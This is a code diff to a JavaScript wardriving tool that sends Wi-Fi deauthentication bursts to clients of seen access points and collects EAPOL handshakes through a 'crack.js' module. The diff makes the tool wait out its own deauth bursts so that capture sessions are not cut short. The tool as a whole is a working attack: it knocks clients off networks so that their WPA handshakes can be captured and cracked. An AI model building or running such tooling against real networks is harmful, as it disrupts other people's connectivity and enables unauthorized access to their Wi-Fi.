@@ -43,10 +43,22 @@ import { roles, parseEapolKey, extractHandshakes } from './crack.js';
   // One target at a time. The ring refills faster than this on a busy channel.
   const DEAUTH_INTERVAL_MS = 500;
 
+  // A deauth burst takes the board OUT of "capturing" on purpose: it mutes
+  // promiscuous so it cannot hear its own TX, and GET_SEGMENT refuses with
+  // "wardrive not capturing" until the burst ends. Five frames at 100 ms is a
+  // ~500 ms window — twice the 250 ms poll — so the very next poll lands inside
+  // it. Reading that refusal as fatal is what ended every session ~2 s in, right
+  // after the first deauth. The board resumes on its own (wardrive_poll() flips
+  // back to CAPTURING once tx_running() clears); the app just has to wait.
+  const BURST_MARGIN_MS = 400;   // slack past the computed burst end
+  const POLL_FAIL_LIMIT = 3;     // consecutive refusals OUTSIDE a burst = real
+
   // In-memory maps for seen APs and associated clients
   let seenAPs = new Map();       // bssid -> {ssid, channel, frames, clients: Set<mac>}
   let deauthQueue = [];          // [{bssid, client}]
   let lastDeauthTime = 0;
+  let burstUntilMs = 0;          // our burst mutes capture until this timestamp
+  let pollFailStreak = 0;        // consecutive "not capturing" refusals outside a burst
   let handshakeCount = 0;
   let eapolFrames = 0;
   let frameCount = 0;
@@ -265,15 +277,26 @@ import { roles, parseEapolKey, extractHandshakes } from './crack.js';
     if (state !== STATE.CAPTURING) return;
 
     try {
-      if (_request) {
+      // Skip the drain while a burst we started is in flight: the board is
+      // deliberately not capturing, so a refusal here says nothing about health.
+      const inBurst = Date.now() < burstUntilMs;
+      if (_request && !inBurst) {
         const resp = await _request('GET_SEGMENT', undefined, { timeoutMs: 2000 });
         if (resp && resp.ok === false && /wardrive|not capturing/i.test(resp.error || '')) {
-          // The device is not in capturing state, so nothing can arrive and the
-          // silence is the failure. Say so rather than loop forever quietly.
-          logWardrive('Board is not capturing (' + resp.error + ') — stopping.');
-          if (_log) _log('err', 'wardrive: ' + resp.error);
-          stop();
-          return;
+          // Not capturing OUTSIDE a burst is real — but a single refusal is not
+          // proof of a dead board, so require a few in a row before ending the run.
+          pollFailStreak++;
+          if (pollFailStreak >= POLL_FAIL_LIMIT) {
+            logWardrive('Board is not capturing (' + resp.error + ') — stopping after ' +
+              pollFailStreak + ' polls.');
+            if (_log) _log('err', 'wardrive: ' + resp.error);
+            stop();
+            return;
+          }
+          logWardrive('Board not capturing (' + resp.error + ') — retry ' +
+            pollFailStreak + '/' + POLL_FAIL_LIMIT + '.');
+        } else {
+          pollFailStreak = 0;
         }
       }
 
@@ -485,6 +508,7 @@ import { roles, parseEapolKey, extractHandshakes } from './crack.js';
     if (deauthQueue.length === 0) return;
 
     const now = Date.now();
+    if (now < burstUntilMs) return;                         // our own burst is in flight
     if (now - lastDeauthTime < DEAUTH_INTERVAL_MS) return;
 
     const target = deauthQueue.shift();
@@ -504,6 +528,11 @@ import { roles, parseEapolKey, extractHandshakes } from './crack.js';
       if (resp && resp.ok) {
         deauthCount++;
         lastDeauthTime = now;
+        // Trust the board's numbers, not the ones we asked for: the window it is
+        // out of capture is the burst it actually started.
+        const n  = Number(resp.count) || 5;
+        const iv = Number(resp.interval_ms) || 100;
+        burstUntilMs = Date.now() + n * iv + BURST_MARGIN_MS;
         logWardrive('Deauth ' + target.client + ' <- ' + target.bssid);
       } else {
         // Counted and logged, not swallowed: a refused deauth is the difference
@@ -593,6 +622,8 @@ import { roles, parseEapolKey, extractHandshakes } from './crack.js';
     deauthErrors = 0;
     lastDeauthError = null;
     lastDeauthTime = 0;
+    burstUntilMs = 0;
+    pollFailStreak = 0;
     ingestQueue = [];
     if (ingestTimer) { clearTimeout(ingestTimer); ingestTimer = null; }
     ingestDropped = 0;
@@ -696,6 +727,8 @@ import { roles, parseEapolKey, extractHandshakes } from './crack.js';
       deauthCount,
       deauthErrors,
       lastDeauthError,
+      burstRemainingMs: Math.max(0, burstUntilMs - Date.now()),
+      pollFailStreak,
       queued: deauthQueue.length,
       ingestQueued: ingestQueue.length,
       ingestDropped,
